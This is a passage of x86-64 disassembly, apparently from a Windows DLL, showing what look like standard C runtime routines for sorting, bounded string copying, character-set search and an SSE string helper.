   18000a644:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   18000a64b:	8b c7                	mov    %edi,%eax
   18000a64d:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   18000a651:	48 33 cd             	xor    %rbp,%rcx
   18000a654:	e8 77 6c ff ff       	call   0x1800012d0
   18000a659:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   18000a65d:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   18000a661:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   18000a665:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   18000a669:	41 5f                	pop    %r15
   18000a66b:	41 5e                	pop    %r14
   18000a66d:	41 5d                	pop    %r13
   18000a66f:	41 5c                	pop    %r12
   18000a671:	5d                   	pop    %rbp
   18000a672:	c3                   	ret
   18000a673:	cc                   	int3
   18000a674:	cc                   	int3
   18000a675:	cc                   	int3
   18000a676:	cc                   	int3
   18000a677:	cc                   	int3
   18000a678:	cc                   	int3
   18000a679:	cc                   	int3
   18000a67a:	cc                   	int3
   18000a67b:	cc                   	int3
   18000a67c:	cc                   	int3
   18000a67d:	cc                   	int3
   18000a67e:	cc                   	int3
   18000a67f:	cc                   	int3
   18000a680:	8b 05 ba 0e 01 00    	mov    0x10eba(%rip),%eax        # 0x18001b540
   18000a686:	90                   	nop
   18000a687:	c3                   	ret
   18000a688:	cc                   	int3
   18000a689:	cc                   	int3
   18000a68a:	cc                   	int3
   18000a68b:	cc                   	int3
   18000a68c:	cc                   	int3
   18000a68d:	cc                   	int3
   18000a68e:	cc                   	int3
   18000a68f:	cc                   	int3
   18000a690:	48 83 ec 28          	sub    $0x28,%rsp
   18000a694:	83 f9 01             	cmp    $0x1,%ecx
   18000a697:	76 15                	jbe    0x18000a6ae
   18000a699:	e8 56 ba ff ff       	call   0x1800060f4
   18000a69e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000a6a4:	e8 a3 b8 ff ff       	call   0x180005f4c
   18000a6a9:	83 c8 ff             	or     $0xffffffff,%eax
   18000a6ac:	eb 08                	jmp    0x18000a6b6
   18000a6ae:	87 0d 8c 0e 01 00    	xchg   %ecx,0x10e8c(%rip)        # 0x18001b540
   18000a6b4:	8b c1                	mov    %ecx,%eax
   18000a6b6:	48 83 c4 28          	add    $0x28,%rsp
   18000a6ba:	c3                   	ret
   18000a6bb:	cc                   	int3
   18000a6bc:	cc                   	int3
   18000a6bd:	cc                   	int3
   18000a6be:	cc                   	int3
   18000a6bf:	cc                   	int3
   18000a6c0:	41 54                	push   %r12
   18000a6c2:	41 55                	push   %r13
   18000a6c4:	41 56                	push   %r14
   18000a6c6:	41 57                	push   %r15
   18000a6c8:	48 81 ec 48 04 00 00 	sub    $0x448,%rsp
   18000a6cf:	48 8b 05 2a f9 00 00 	mov    0xf92a(%rip),%rax        # 0x18001a000
   18000a6d6:	48 33 c4             	xor    %rsp,%rax
   18000a6d9:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   18000a6e0:	00 
   18000a6e1:	4d 8b e1             	mov    %r9,%r12
   18000a6e4:	4d 8b f0             	mov    %r8,%r14
   18000a6e7:	4c 8b fa             	mov    %rdx,%r15
   18000a6ea:	4c 8b e9             	mov    %rcx,%r13
   18000a6ed:	48 85 c9             	test   %rcx,%rcx
   18000a6f0:	75 1a                	jne    0x18000a70c
   18000a6f2:	48 85 d2             	test   %rdx,%rdx
   18000a6f5:	74 15                	je     0x18000a70c
   18000a6f7:	e8 f8 b9 ff ff       	call   0x1800060f4
   18000a6fc:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000a702:	e8 45 b8 ff ff       	call   0x180005f4c
   18000a707:	e9 2c 03 00 00       	jmp    0x18000aa38
   18000a70c:	4d 85 f6             	test   %r14,%r14
   18000a70f:	74 e6                	je     0x18000a6f7
   18000a711:	4d 85 e4             	test   %r12,%r12
   18000a714:	74 e1                	je     0x18000a6f7
   18000a716:	49 8b cc             	mov    %r12,%rcx
   18000a719:	e8 6a 21 00 00       	call   0x18000c888
   18000a71e:	33 d2                	xor    %edx,%edx
   18000a720:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000a725:	41 b8 f0 01 00 00    	mov    $0x1f0,%r8d
   18000a72b:	e8 80 32 00 00       	call   0x18000d9b0
   18000a730:	33 d2                	xor    %edx,%edx
   18000a732:	48 8d 8c 24 20 02 00 	lea    0x220(%rsp),%rcx
   18000a739:	00 
   18000a73a:	41 b8 f0 01 00 00    	mov    $0x1f0,%r8d
   18000a740:	e8 6b 32 00 00       	call   0x18000d9b0
   18000a745:	49 83 ff 02          	cmp    $0x2,%r15
   18000a749:	0f 82 e9 02 00 00    	jb     0x18000aa38
   18000a74f:	49 ff cf             	dec    %r15
   18000a752:	48 89 9c 24 40 04 00 	mov    %rbx,0x440(%rsp)
   18000a759:	00 
   18000a75a:	4d 0f af fe          	imul   %r14,%r15
   18000a75e:	48 89 ac 24 38 04 00 	mov    %rbp,0x438(%rsp)
   18000a765:	00 
   18000a766:	4d 03 fd             	add    %r13,%r15
   18000a769:	48 89 b4 24 30 04 00 	mov    %rsi,0x430(%rsp)
   18000a770:	00 
   18000a771:	33 c9                	xor    %ecx,%ecx
   18000a773:	48 89 bc 24 28 04 00 	mov    %rdi,0x428(%rsp)
   18000a77a:	00 
   18000a77b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000a780:	33 d2                	xor    %edx,%edx
   18000a782:	49 8b c7             	mov    %r15,%rax
   18000a785:	49 2b c5             	sub    %r13,%rax
   18000a788:	49 f7 f6             	div    %r14
   18000a78b:	48 8d 58 01          	lea    0x1(%rax),%rbx
   18000a78f:	48 83 fb 08          	cmp    $0x8,%rbx
   18000a793:	0f 87 8b 00 00 00    	ja     0x18000a824
   18000a799:	4d 3b fd             	cmp    %r13,%r15
   18000a79c:	76 65                	jbe    0x18000a803
   18000a79e:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   18000a7a2:	49 8b dd             	mov    %r13,%rbx
   18000a7a5:	48 8b fe             	mov    %rsi,%rdi
   18000a7a8:	49 3b f7             	cmp    %r15,%rsi
   18000a7ab:	77 20                	ja     0x18000a7cd
   18000a7ad:	0f 1f 00             	nopl   (%rax)
   18000a7b0:	48 8b d3             	mov    %rbx,%rdx
   18000a7b3:	48 8b cf             	mov    %rdi,%rcx
   18000a7b6:	41 ff d4             	call   *%r12
   18000a7b9:	85 c0                	test   %eax,%eax
   18000a7bb:	48 8b cf             	mov    %rdi,%rcx
   18000a7be:	48 0f 4e cb          	cmovle %rbx,%rcx
   18000a7c2:	49 03 fe             	add    %r14,%rdi
   18000a7c5:	48 8b d9             	mov    %rcx,%rbx
   18000a7c8:	49 3b ff             	cmp    %r15,%rdi
   18000a7cb:	76 e3                	jbe    0x18000a7b0
   18000a7cd:	4d 8b c6             	mov    %r14,%r8
   18000a7d0:	49 8b d7             	mov    %r15,%rdx
   18000a7d3:	49 3b df             	cmp    %r15,%rbx
   18000a7d6:	74 1e                	je     0x18000a7f6
   18000a7d8:	49 2b df             	sub    %r15,%rbx
   18000a7db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000a7e0:	0f b6 02             	movzbl (%rdx),%eax
   18000a7e3:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   18000a7e7:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   18000a7ea:	88 0a                	mov    %cl,(%rdx)
   18000a7ec:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000a7f0:	49 83 e8 01          	sub    $0x1,%r8
   18000a7f4:	75 ea                	jne    0x18000a7e0
   18000a7f6:	4d 2b fe             	sub    %r14,%r15
   18000a7f9:	4d 3b fd             	cmp    %r13,%r15
   18000a7fc:	77 a4                	ja     0x18000a7a2
   18000a7fe:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000a803:	48 83 e9 01          	sub    $0x1,%rcx
   18000a807:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000a80c:	0f 88 06 02 00 00    	js     0x18000aa18
   18000a812:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   18000a817:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   18000a81e:	00 
   18000a81f:	e9 5c ff ff ff       	jmp    0x18000a780
   18000a824:	48 d1 eb             	shr    $1,%rbx
   18000a827:	49 8b cd             	mov    %r13,%rcx
   18000a82a:	49 0f af de          	imul   %r14,%rbx
   18000a82e:	4a 8d 3c 2b          	lea    (%rbx,%r13,1),%rdi
   18000a832:	48 8b d7             	mov    %rdi,%rdx
   18000a835:	41 ff d4             	call   *%r12
   18000a838:	85 c0                	test   %eax,%eax
   18000a83a:	7e 2f                	jle    0x18000a86b
   18000a83c:	4d 8b ce             	mov    %r14,%r9
   18000a83f:	4c 8b c7             	mov    %rdi,%r8
   18000a842:	4c 3b ef             	cmp    %rdi,%r13
   18000a845:	74 24                	je     0x18000a86b
   18000a847:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000a84e:	00 00 
   18000a850:	41 0f b6 00          	movzbl (%r8),%eax
   18000a854:	49 8b d0             	mov    %r8,%rdx
   18000a857:	48 2b d3             	sub    %rbx,%rdx
   18000a85a:	0f b6 0a             	movzbl (%rdx),%ecx
   18000a85d:	88 02                	mov    %al,(%rdx)
   18000a85f:	41 88 08             	mov    %cl,(%r8)
   18000a862:	49 ff c0             	inc    %r8
   18000a865:	49 83 e9 01          	sub    $0x1,%r9
   18000a869:	75 e5                	jne    0x18000a850
   18000a86b:	49 8b d7             	mov    %r15,%rdx
   18000a86e:	49 8b cd             	mov    %r13,%rcx
   18000a871:	41 ff d4             	call   *%r12
   18000a874:	85 c0                	test   %eax,%eax
   18000a876:	7e 30                	jle    0x18000a8a8
   18000a878:	4d 8b c6             	mov    %r14,%r8
   18000a87b:	49 8b d7             	mov    %r15,%rdx
   18000a87e:	4d 3b ef             	cmp    %r15,%r13
   18000a881:	74 25                	je     0x18000a8a8
   18000a883:	4d 8b cd             	mov    %r13,%r9
   18000a886:	4d 2b cf             	sub    %r15,%r9
   18000a889:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   18000a890:	0f b6 02             	movzbl (%rdx),%eax
   18000a893:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   18000a898:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   18000a89c:	88 0a                	mov    %cl,(%rdx)
   18000a89e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000a8a2:	49 83 e8 01          	sub    $0x1,%r8
   18000a8a6:	75 e8                	jne    0x18000a890
   18000a8a8:	49 8b d7             	mov    %r15,%rdx
   18000a8ab:	48 8b cf             	mov    %rdi,%rcx
   18000a8ae:	41 ff d4             	call   *%r12
   18000a8b1:	85 c0                	test   %eax,%eax
   18000a8b3:	7e 33                	jle    0x18000a8e8
   18000a8b5:	4d 8b c6             	mov    %r14,%r8
   18000a8b8:	49 8b d7             	mov    %r15,%rdx
   18000a8bb:	49 3b ff             	cmp    %r15,%rdi
   18000a8be:	74 28                	je     0x18000a8e8
   18000a8c0:	4c 8b cf             	mov    %rdi,%r9
   18000a8c3:	4d 2b cf             	sub    %r15,%r9
   18000a8c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000a8cd:	00 00 00 
   18000a8d0:	0f b6 02             	movzbl (%rdx),%eax
   18000a8d3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   18000a8d8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   18000a8dc:	88 0a                	mov    %cl,(%rdx)
   18000a8de:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000a8e2:	49 83 e8 01          	sub    $0x1,%r8
   18000a8e6:	75 e8                	jne    0x18000a8d0
   18000a8e8:	49 8b dd             	mov    %r13,%rbx
   18000a8eb:	49 8b f7             	mov    %r15,%rsi
   18000a8ee:	66 90                	xchg   %ax,%ax
   18000a8f0:	48 3b fb             	cmp    %rbx,%rdi
   18000a8f3:	76 1b                	jbe    0x18000a910
   18000a8f5:	49 03 de             	add    %r14,%rbx
   18000a8f8:	48 3b df             	cmp    %rdi,%rbx
   18000a8fb:	73 13                	jae    0x18000a910
   18000a8fd:	48 8b d7             	mov    %rdi,%rdx
   18000a900:	48 8b cb             	mov    %rbx,%rcx
   18000a903:	41 ff d4             	call   *%r12
   18000a906:	85 c0                	test   %eax,%eax
   18000a908:	7e eb                	jle    0x18000a8f5
   18000a90a:	eb 19                	jmp    0x18000a925
   18000a90c:	0f 1f 40 00          	nopl   0x0(%rax)
   18000a910:	49 03 de             	add    %r14,%rbx
   18000a913:	49 3b df             	cmp    %r15,%rbx
   18000a916:	77 0d                	ja     0x18000a925
   18000a918:	48 8b d7             	mov    %rdi,%rdx
   18000a91b:	48 8b cb             	mov    %rbx,%rcx
   18000a91e:	41 ff d4             	call   *%r12
   18000a921:	85 c0                	test   %eax,%eax
   18000a923:	7e eb                	jle    0x18000a910
   18000a925:	48 8b ee             	mov    %rsi,%rbp
   18000a928:	49 2b f6             	sub    %r14,%rsi
   18000a92b:	48 3b f7             	cmp    %rdi,%rsi
   18000a92e:	76 0d                	jbe    0x18000a93d
   18000a930:	48 8b d7             	mov    %rdi,%rdx
   18000a933:	48 8b ce             	mov    %rsi,%rcx
   18000a936:	41 ff d4             	call   *%r12
   18000a939:	85 c0                	test   %eax,%eax
   18000a93b:	7f e8                	jg     0x18000a925
   18000a93d:	48 3b f3             	cmp    %rbx,%rsi
   18000a940:	72 38                	jb     0x18000a97a
   18000a942:	4d 8b c6             	mov    %r14,%r8
   18000a945:	48 8b d6             	mov    %rsi,%rdx
   18000a948:	74 1e                	je     0x18000a968
   18000a94a:	4c 8b cb             	mov    %rbx,%r9
   18000a94d:	4c 2b ce             	sub    %rsi,%r9
   18000a950:	0f b6 02             	movzbl (%rdx),%eax
   18000a953:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   18000a958:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   18000a95c:	88 0a                	mov    %cl,(%rdx)
   18000a95e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000a962:	49 83 e8 01          	sub    $0x1,%r8
   18000a966:	75 e8                	jne    0x18000a950
   18000a968:	48 3b fe             	cmp    %rsi,%rdi
   18000a96b:	48 8b c3             	mov    %rbx,%rax
   18000a96e:	48 0f 45 c7          	cmovne %rdi,%rax
   18000a972:	48 8b f8             	mov    %rax,%rdi
   18000a975:	e9 76 ff ff ff       	jmp    0x18000a8f0
   18000a97a:	48 3b fd             	cmp    %rbp,%rdi
   18000a97d:	73 18                	jae    0x18000a997
   18000a97f:	90                   	nop
   18000a980:	49 2b ee             	sub    %r14,%rbp
   18000a983:	48 3b ef             	cmp    %rdi,%rbp
   18000a986:	76 0f                	jbe    0x18000a997
   18000a988:	48 8b d7             	mov    %rdi,%rdx
   18000a98b:	48 8b cd             	mov    %rbp,%rcx
   18000a98e:	41 ff d4             	call   *%r12
   18000a991:	85 c0                	test   %eax,%eax
   18000a993:	74 eb                	je     0x18000a980
   18000a995:	eb 15                	jmp    0x18000a9ac
   18000a997:	49 2b ee             	sub    %r14,%rbp
   18000a99a:	49 3b ed             	cmp    %r13,%rbp
   18000a99d:	76 0d                	jbe    0x18000a9ac
   18000a99f:	48 8b d7             	mov    %rdi,%rdx
   18000a9a2:	48 8b cd             	mov    %rbp,%rcx
   18000a9a5:	41 ff d4             	call   *%r12
   18000a9a8:	85 c0                	test   %eax,%eax
   18000a9aa:	74 eb                	je     0x18000a997
   18000a9ac:	49 8b cf             	mov    %r15,%rcx
   18000a9af:	48 8b c5             	mov    %rbp,%rax
   18000a9b2:	48 2b cb             	sub    %rbx,%rcx
   18000a9b5:	49 2b c5             	sub    %r13,%rax
   18000a9b8:	48 3b c1             	cmp    %rcx,%rax
   18000a9bb:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000a9c0:	7c 2b                	jl     0x18000a9ed
   18000a9c2:	4c 3b ed             	cmp    %rbp,%r13
   18000a9c5:	73 15                	jae    0x18000a9dc
   18000a9c7:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   18000a9cc:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   18000a9d3:	00 
   18000a9d4:	48 ff c1             	inc    %rcx
   18000a9d7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000a9dc:	49 3b df             	cmp    %r15,%rbx
   18000a9df:	0f 83 1e fe ff ff    	jae    0x18000a803
   18000a9e5:	4c 8b eb             	mov    %rbx,%r13
   18000a9e8:	e9 93 fd ff ff       	jmp    0x18000a780
   18000a9ed:	49 3b df             	cmp    %r15,%rbx
   18000a9f0:	73 15                	jae    0x18000aa07
   18000a9f2:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   18000a9f7:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   18000a9fe:	00 
   18000a9ff:	48 ff c1             	inc    %rcx
   18000aa02:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000aa07:	4c 3b ed             	cmp    %rbp,%r13
   18000aa0a:	0f 83 f3 fd ff ff    	jae    0x18000a803
   18000aa10:	4c 8b fd             	mov    %rbp,%r15
   18000aa13:	e9 68 fd ff ff       	jmp    0x18000a780
   18000aa18:	48 8b b4 24 30 04 00 	mov    0x430(%rsp),%rsi
   18000aa1f:	00 
   18000aa20:	48 8b ac 24 38 04 00 	mov    0x438(%rsp),%rbp
   18000aa27:	00 
   18000aa28:	48 8b 9c 24 40 04 00 	mov    0x440(%rsp),%rbx
   18000aa2f:	00 
   18000aa30:	48 8b bc 24 28 04 00 	mov    0x428(%rsp),%rdi
   18000aa37:	00 
   18000aa38:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   18000aa3f:	00 
   18000aa40:	48 33 cc             	xor    %rsp,%rcx
   18000aa43:	e8 88 68 ff ff       	call   0x1800012d0
   18000aa48:	48 81 c4 48 04 00 00 	add    $0x448,%rsp
   18000aa4f:	41 5f                	pop    %r15
   18000aa51:	41 5e                	pop    %r14
   18000aa53:	41 5d                	pop    %r13
   18000aa55:	41 5c                	pop    %r12
   18000aa57:	c3                   	ret
   18000aa58:	cc                   	int3
   18000aa59:	cc                   	int3
   18000aa5a:	cc                   	int3
   18000aa5b:	cc                   	int3
   18000aa5c:	cc                   	int3
   18000aa5d:	cc                   	int3
   18000aa5e:	cc                   	int3
   18000aa5f:	cc                   	int3
   18000aa60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000aa65:	57                   	push   %rdi
   18000aa66:	48 83 ec 20          	sub    $0x20,%rsp
   18000aa6a:	49 8b f9             	mov    %r9,%rdi
   18000aa6d:	4d 8b d0             	mov    %r8,%r10
   18000aa70:	48 8b da             	mov    %rdx,%rbx
   18000aa73:	4c 8b d9             	mov    %rcx,%r11
   18000aa76:	4d 85 c9             	test   %r9,%r9
   18000aa79:	75 17                	jne    0x18000aa92
   18000aa7b:	48 85 c9             	test   %rcx,%rcx
   18000aa7e:	75 17                	jne    0x18000aa97
   18000aa80:	48 85 d2             	test   %rdx,%rdx
   18000aa83:	75 34                	jne    0x18000aab9
   18000aa85:	33 c0                	xor    %eax,%eax
   18000aa87:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000aa8c:	48 83 c4 20          	add    $0x20,%rsp
   18000aa90:	5f                   	pop    %rdi
   18000aa91:	c3                   	ret
   18000aa92:	4d 85 db             	test   %r11,%r11
   18000aa95:	74 22                	je     0x18000aab9
   18000aa97:	48 85 db             	test   %rbx,%rbx
   18000aa9a:	74 1d                	je     0x18000aab9
   18000aa9c:	48 85 ff             	test   %rdi,%rdi
   18000aa9f:	75 10                	jne    0x18000aab1
   18000aaa1:	40 88 39             	mov    %dil,(%rcx)
   18000aaa4:	33 c0                	xor    %eax,%eax
   18000aaa6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000aaab:	48 83 c4 20          	add    $0x20,%rsp
   18000aaaf:	5f                   	pop    %rdi
   18000aab0:	c3                   	ret
   18000aab1:	4d 85 d2             	test   %r10,%r10
   18000aab4:	75 23                	jne    0x18000aad9
   18000aab6:	44 88 11             	mov    %r10b,(%rcx)
   18000aab9:	e8 36 b6 ff ff       	call   0x1800060f4
   18000aabe:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000aac4:	e8 83 b4 ff ff       	call   0x180005f4c
   18000aac9:	b8 16 00 00 00       	mov    $0x16,%eax
   18000aace:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000aad3:	48 83 c4 20          	add    $0x20,%rsp
   18000aad7:	5f                   	pop    %rdi
   18000aad8:	c3                   	ret
   18000aad9:	4d 2b d3             	sub    %r11,%r10
   18000aadc:	4c 8b c7             	mov    %rdi,%r8
   18000aadf:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   18000aae3:	75 2b                	jne    0x18000ab10
   18000aae5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000aaec:	00 00 00 00 
   18000aaf0:	41 0f b6 04 0a       	movzbl (%r10,%rcx,1),%eax
   18000aaf5:	88 01                	mov    %al,(%rcx)
   18000aaf7:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   18000aafb:	84 c0                	test   %al,%al
   18000aafd:	74 86                	je     0x18000aa85
   18000aaff:	48 83 ea 01          	sub    $0x1,%rdx
   18000ab03:	75 eb                	jne    0x18000aaf0
   18000ab05:	eb 3d                	jmp    0x18000ab44
   18000ab07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000ab0e:	00 00 
   18000ab10:	41 0f b6 04 0a       	movzbl (%r10,%rcx,1),%eax
   18000ab15:	4d 8b c8             	mov    %r8,%r9
   18000ab18:	88 01                	mov    %al,(%rcx)
   18000ab1a:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   18000ab1e:	84 c0                	test   %al,%al
   18000ab20:	0f 84 5f ff ff ff    	je     0x18000aa85
   18000ab26:	48 83 ea 01          	sub    $0x1,%rdx
   18000ab2a:	74 06                	je     0x18000ab32
   18000ab2c:	49 83 e8 01          	sub    $0x1,%r8
   18000ab30:	75 de                	jne    0x18000ab10
   18000ab32:	48 85 d2             	test   %rdx,%rdx
   18000ab35:	49 8d 41 ff          	lea    -0x1(%r9),%rax
   18000ab39:	49 0f 44 c1          	cmove  %r9,%rax
   18000ab3d:	48 85 c0             	test   %rax,%rax
   18000ab40:	75 02                	jne    0x18000ab44
   18000ab42:	88 01                	mov    %al,(%rcx)
   18000ab44:	48 85 d2             	test   %rdx,%rdx
   18000ab47:	0f 85 38 ff ff ff    	jne    0x18000aa85
   18000ab4d:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   18000ab51:	75 13                	jne    0x18000ab66
   18000ab53:	41 88 54 1b ff       	mov    %dl,-0x1(%r11,%rbx,1)
   18000ab58:	8d 42 50             	lea    0x50(%rdx),%eax
   18000ab5b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ab60:	48 83 c4 20          	add    $0x20,%rsp
   18000ab64:	5f                   	pop    %rdi
   18000ab65:	c3                   	ret
   18000ab66:	41 c6 03 00          	movb   $0x0,(%r11)
   18000ab6a:	e8 85 b5 ff ff       	call   0x1800060f4
   18000ab6f:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   18000ab75:	e8 d2 b3 ff ff       	call   0x180005f4c
   18000ab7a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000ab7f:	b8 22 00 00 00       	mov    $0x22,%eax
   18000ab84:	48 83 c4 20          	add    $0x20,%rsp
   18000ab88:	5f                   	pop    %rdi
   18000ab89:	c3                   	ret
   18000ab8a:	cc                   	int3
   18000ab8b:	cc                   	int3
   18000ab8c:	cc                   	int3
   18000ab8d:	cc                   	int3
   18000ab8e:	cc                   	int3
   18000ab8f:	cc                   	int3
   18000ab90:	48 83 ec 38          	sub    $0x38,%rsp
   18000ab94:	48 8b 05 65 f4 00 00 	mov    0xf465(%rip),%rax        # 0x18001a000
   18000ab9b:	48 33 c4             	xor    %rsp,%rax
   18000ab9e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000aba3:	0f b6 02             	movzbl (%rdx),%eax
   18000aba6:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000aba9:	4c 8b c1             	mov    %rcx,%r8
   18000abac:	0f 11 04 24          	movups %xmm0,(%rsp)
   18000abb0:	0f 11 44 24 10       	movups %xmm0,0x10(%rsp)
   18000abb5:	84 c0                	test   %al,%al
   18000abb7:	74 1d                	je     0x18000abd6
   18000abb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   18000abc0:	0f b6 c0             	movzbl %al,%eax
   18000abc3:	48 8d 0c 24          	lea    (%rsp),%rcx
   18000abc7:	0f ab 01             	bts    %eax,(%rcx)
   18000abca:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   18000abce:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   18000abd2:	84 c0                	test   %al,%al
   18000abd4:	75 ea                	jne    0x18000abc0
   18000abd6:	41 0f b6 08          	movzbl (%r8),%ecx
   18000abda:	84 c9                	test   %cl,%cl
   18000abdc:	74 23                	je     0x18000ac01
   18000abde:	66 90                	xchg   %ax,%ax
   18000abe0:	0f b6 c1             	movzbl %cl,%eax
   18000abe3:	80 e1 07             	and    $0x7,%cl
   18000abe6:	48 c1 e8 03          	shr    $0x3,%rax
   18000abea:	0f b6 14 04          	movzbl (%rsp,%rax,1),%edx
   18000abee:	d2 ea                	shr    %cl,%dl
   18000abf0:	f6 c2 01             	test   $0x1,%dl
   18000abf3:	75 20                	jne    0x18000ac15
   18000abf5:	41 0f b6 48 01       	movzbl 0x1(%r8),%ecx
   18000abfa:	49 ff c0             	inc    %r8
   18000abfd:	84 c9                	test   %cl,%cl
   18000abff:	75 df                	jne    0x18000abe0
   18000ac01:	33 c0                	xor    %eax,%eax
   18000ac03:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000ac08:	48 33 cc             	xor    %rsp,%rcx
   18000ac0b:	e8 c0 66 ff ff       	call   0x1800012d0
   18000ac10:	48 83 c4 38          	add    $0x38,%rsp
   18000ac14:	c3                   	ret
   18000ac15:	49 8b c0             	mov    %r8,%rax
   18000ac18:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000ac1d:	48 33 cc             	xor    %rsp,%rcx
   18000ac20:	e8 ab 66 ff ff       	call   0x1800012d0
   18000ac25:	48 83 c4 38          	add    $0x38,%rsp
   18000ac29:	c3                   	ret
   18000ac2a:	cc                   	int3
   18000ac2b:	cc                   	int3
   18000ac2c:	cc                   	int3
   18000ac2d:	cc                   	int3
   18000ac2e:	cc                   	int3
   18000ac2f:	cc                   	int3
   18000ac30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ac35:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000ac3a:	57                   	push   %rdi
   18000ac3b:	4c 8b d2             	mov    %rdx,%r10
   18000ac3e:	48 8d 35 bb 53 ff ff 	lea    -0xac45(%rip),%rsi        # 0x180000000
   18000ac45:	41 83 e2 0f          	and    $0xf,%r10d
   18000ac49:	48 8b da             	mov    %rdx,%rbx
   18000ac4c:	49 2b da             	sub    %r10,%rbx
   18000ac4f:	33 ff                	xor    %edi,%edi
   18000ac51:	4c 8b da             	mov    %rdx,%r11
   18000ac54:	4c 8b c1             	mov    %rcx,%r8
   18000ac57:	0f 57 db             	xorps  %xmm3,%xmm3
   18000ac5a:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   18000ac5e:	f3 0f 6f 0b          	movdqu (%rbx),%xmm1
   18000ac62:	48 83 f8 0e          	cmp    $0xe,%rax
   18000ac66:	77 73                	ja     0x18000acdb
   18000ac68:	8b 84 86 2c af 00 00 	mov    0xaf2c(%rsi,%rax,4),%eax
   18000ac6f:	48 03 c6             	add    %rsi,%rax
   18000ac72:	ff e0                	jmp    *%rax
   18000ac74:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   18000ac79:	eb 60                	jmp    0x18000acdb
   18000ac7b:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   18000ac80:	eb 59                	jmp    0x18000acdb
   18000ac82:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   18000ac87:	eb 52                	jmp    0x18000acdb
   18000ac89:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   18000ac8e:	eb 4b                	jmp    0x18000acdb
   18000ac90:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   18000ac95:	eb 44                	jmp    0x18000acdb
   18000ac97:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   18000ac9c:	eb 3d                	jmp    0x18000acdb
   18000ac9e:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   18000aca3:	eb 36                	jmp    0x18000acdb
   18000aca5:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   18000acaa:	eb 2f                	jmp    0x18000acdb
   18000acac:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   18000acb1:	eb 28                	jmp    0x18000acdb
   18000acb3:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   18000acb8:	eb 21                	jmp    0x18000acdb
   18000acba:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   18000acbf:	eb 1a                	jmp    0x18000acdb
   18000acc1:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
